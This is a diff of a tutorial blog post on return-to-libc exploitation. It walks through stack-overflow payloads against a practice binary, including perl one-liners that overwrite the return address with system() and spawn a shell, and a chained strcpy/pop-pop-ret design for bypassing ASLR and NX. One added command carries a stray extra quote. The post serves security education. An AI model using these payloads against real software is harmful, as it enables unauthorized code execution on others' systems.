@@ -6,7 +6,7 @@ tags:         system-security aslr nx
 permalink:    /ret2libc/
 ---
 
-In "[Defeating ASLR: The Return-to-pop Method](https://xingjianxuanyuan.github.io/ret2pop/)", I constructed a payload that used the <code>ret</code> and <code>pop-ret</code> instructions to inject shellcode into our vulnerable program with **ASLR**{: style="color: red"} enabled but non-executable stack (hereinafter "**NX**{: style="color: red"}") disabled. The payload worked just as expected because we knew that the memory space between <code>ans_buf</code> and the address we were returning to is larger than our shellcode. What if the memory space is not large enough? More importantly, what if we do not have a shellcode at our disposal? In this post, I would like to describe an exploitation technique called "**return-to-libc**{: style="color: red"}", which makes use of existing code (the C standard library) to spawn a shell. The documentation is organized into two parts: for the first part, the ASLR protection is turned off; and for the second part, both ASLR and NX are enabled.
+In "[Defeating ASLR: The Return-to-pop Method](https://xingjianxuanyuan.github.io/ret2pop/)", I constructed a payload that used the <code>ret</code> and <code>pop-ret</code> instructions to inject shellcode into our vulnerable program with **ASLR**{: style="color: red"} enabled but non-executable stack (hereinafter "**NX**{: style="color: red"}") disabled. The payload worked just as expected because we knew that the memory space between <code>ans_buf</code> and the address we were returning to is larger than our shellcode. What if the memory space is not large enough? More importantly, what if we do not have a shellcode at our disposal? In this post, I would like to describe an exploitation technique called "**return-to-libc**{: style="color: red"}", which makes use of existing code ("libc" is used by convention as a shorthand for the "**standard C library**{: style="color: red"}") to spawn a shell. The documentation is organized into two parts: for the first part, the ASLR protection is turned off; and for the second part, both ASLR and NX are enabled.
 
 <!-- excerpt-end -->
 
@@ -83,7 +83,7 @@ Ignoring the padding, the first two values are addresses of code. The third valu
 
 ### Addresses We Need
 
-Let's find out the address of the <code>system()</code> system call:
+Let's find out the address of the <code>system()</code> standard C library function:
 ```bash
 $ objdump -D ans_check7 | grep system
 08049110 <system@plt>:
@@ -156,4 +156,41 @@ sh: 1: <???%>: not found
 sh: 1: <???%>: not found
 sh: 1: j: not found
 ```
-Note that the leading two bytes of NOPS are for four-byte alignment requirement, given that our <code>ans_buf</code> has a size of $38$ bytes.
+Note that the leading two bytes of NOPS in our payload are for four-byte alignment requirement, given that <code>ans_buf</code> has a size of $38$ bytes. The output indicates that <code>&system()</code> does overwrite the return address but the <code>SHELL</code> variable is wrongly positioned. I kept decreasing the value of repeated <code>&system()</code> until:
+```bash
+$ ./ans_check7 $(perl -e 'print "\x90"x2, "\x10\x91\x04\x08"x14, "\xee\x92\x04\x08", "\x32\xd8\xff\xff"')
+sh: 1: /bash: not found
+```
+This result indicates that the <code>SHELL</code> variable is correctly positioned but the address I provided is probably off by a few bytes. If I modify the byte stream of <code>\x32\xd8\xff\xff</code> to <code>\x2e\xd8\xff\xff</code>:
+```bash
+$ ./ans_check7 $(perl -e 'print ""\x90"x2, "\x10\x91\x04\x08"x14, "\xee\x92\x04\x08", "\x2e\xd8\xff\xff"')
+$ echo $$
+3641
+```
+The shell is spawned successfully. Alternatively, this command also works:
+```bash
+$ ./ans_check7 $(perl -e 'print "\x90"x54, "\x10\x91\x04\x08", "\xee\x92\x04\x08", "\x2e\xd8\xff\xff"')
+```
+
+## Part II
+
+Ensure that ASLR is turned on:
+```bash
+$ cat /proc/sys/kernel/randomize_va_space
+2
+```
+
+We can use the return-to-libc method to construct our target string at an address of our choosing, and then provide this address. In particular, we can construct a build-string payload with the following organization:
+<p id="console">&strcpy@plt | &pop-pop-ret | str_loc_1 | src_byte_addr_1 |</p>
+<p id="console">&strcpy@plt | &pop-pop-ret | str_loc_2 | src_byte_addr_2 |</p>
+<p id="console">...</p>
+<p id="console">&strcpy@plt | &pop-pop-ret | str_loc_n | src_byte_addr_n |</p>
+where:
+- <code>&strcpy@plt</code> is the address of the <code>strcpy</code> libc function, which will be used to create our desired string by copying it one character at a time;
+- <code>&pop-pop-ret</code> is the address of a <code>pop-pop-ret</code> instruction sequence in our binary;
+- <code>str_loc_i</code>'s are our chosen destination string addresses;
+- <code>src_byte_addr_i</code> is the address that holds the byte representation of the <i>i</i>th character in our target string;
+- <code>&strcpy@plt</code> on the first line is positioned within the payload to overwrite the return address on the stack.
+
+If we inject the above instructions properly onto the stack, our vulnerable program will return to the first <code>&strcpy@plt</code> instead of its original return address. And what will happen? The addresses <code>str_loc_1</code> and <code>src_byte_addr_1</code> are arguments for the <code>strcpy</code> libc function. The character stored at <code>src_byte_addr_1</code> will be copied into <code>str_loc_1</code>. The <code>strcpy</code> function will subsequently return to the first <code>&pop-pop-ret</code> sequence, which pops <code>str_loc_1</code> and <code>src_byte_addr_1</code> off the stack and pushes the next instruction (the second <code>&strcpy@plt</code>) onto the stack. In this way, our <i>n</i> <code>strcpy</code> functions are chained together to create an <i>n</i>-byte string starting at <code>str_loc_1</code>. The new payload we are developing is to have the following structure:
+<p id="console">PADDING | build-string-payload | &system() | &exit_path | &cmd_string</p>
